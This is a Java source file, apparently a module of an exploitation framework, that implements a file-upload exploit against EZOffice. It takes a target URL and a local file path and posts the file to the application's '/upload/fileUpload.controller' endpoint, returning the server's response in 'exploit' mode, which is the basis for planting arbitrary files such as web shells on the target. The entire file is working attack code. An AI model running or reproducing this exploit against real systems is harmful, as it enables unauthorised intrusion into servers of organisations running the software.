package com.droplab.Controller.EZOffice.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

public class EZOfficeFileUploadController extends BugService {
    private final String contentPath = "/upload/fileUpload.controller";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                String modelName = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("modelName")) {
                        modelName = params.get(key);
                    }
                }
                if (!url.equals("")) {
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    headers.put("Accept", "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8");

                    HashMap paraMap = new HashMap<String,String>();
                    paraMap.put("modelName", modelName);
                    HashMap FileMap = new HashMap<String, File>();
                    FileMap.put("file", new File(filepath));
                    Connection.Response response = HttpUtils.post(url + contentPath, headers, paraMap, FileMap);
                    if (type.equals("exploit")) {
                        return response;
                    }
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
